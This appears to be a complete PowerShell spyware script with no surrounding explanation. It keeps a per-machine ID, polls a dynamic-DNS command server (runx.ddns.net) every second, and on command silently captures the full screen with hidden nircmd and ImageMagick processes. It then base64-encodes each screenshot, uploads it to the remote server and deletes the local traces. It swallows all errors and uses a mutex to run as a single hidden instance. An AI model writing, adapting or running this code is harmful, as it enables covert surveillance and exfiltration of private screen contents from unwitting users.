if (!(Test-Path "$env:TEMP\run")) {
  $null = New-Item "$env:TEMP\run" -ItemType Directory
}

$mutex = New-Object System.Threading.Mutex($false, "ss_control")
if (-not $mutex.WaitOne(0)) {
  exit
}

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "101e4bb"
$clientVersion = $SCRIPT_VERSION



$UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
if (!(Test-Path $UserFolder)) {
  $null = New-Item $UserFolder -ItemType Directory
}

Add-Type -AssemblyName System.Drawing

$VPS_POLL_URL = "http://runx.ddns.net/api/poll_frames"
$VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"

while ($true) {
  try {
    $fullUri = $VPS_POLL_URL + "?username=" + $uniqueUser + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
    $response = Invoke-RestMethod -Method Get -Uri $fullUri -TimeoutSec 10 -UseBasicParsing

    if ($response) {
      if ($response -is [string]) {
        $response = $response | ConvertFrom-Json
      }
    }

    if ($response -and $response.capture -eq $true) {
      $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"
      $RawPath = Join-Path $UserFolder "raw_$Timestamp.png"
      $JpegPath = Join-Path $UserFolder "$Timestamp.jpg"

      Start-Process `
        -FilePath "$env:TEMP\run\nircmd\nircmd.exe" `
        -ArgumentList @(
        "savescreenshotfull",
        $RawPath
      ) -WindowStyle Hidden -Wait

      if (Test-Path $RawPath) {
        $MagickExe = "$env:TEMP\run\magick\magick.exe"
        $magickArgs = "`"$RawPath`" -colorspace gray -resize 50% -quality 80 `"$JpegPath`""

        Start-Process `
          -FilePath $MagickExe `
          -ArgumentList @(
          $magickArgs
        ) -WindowStyle Hidden -Wait

        Remove-Item $RawPath -Force
      }

      if (Test-Path $JpegPath) {
        $fileBytes = [System.IO.File]::ReadAllBytes($JpegPath)
        $base64Image = [Convert]::ToBase64String($fileBytes)
        $body = @{
          username = $uniqueUser
          filename = (Get-Item $JpegPath).Name
          image = $base64Image
        } | ConvertTo-Json -Compress

        Invoke-RestMethod `
          -Method Post `
          -Uri $VPS_UPLOAD_URL `
          -ContentType "application/json" `
          -Body $body `
          -TimeoutSec 10 `
          -UseBasicParsing |
          Out-Null

        Remove-Item $JpegPath -Force
      }
    }
  }
  catch {}
  Start-Sleep -Seconds 1
}
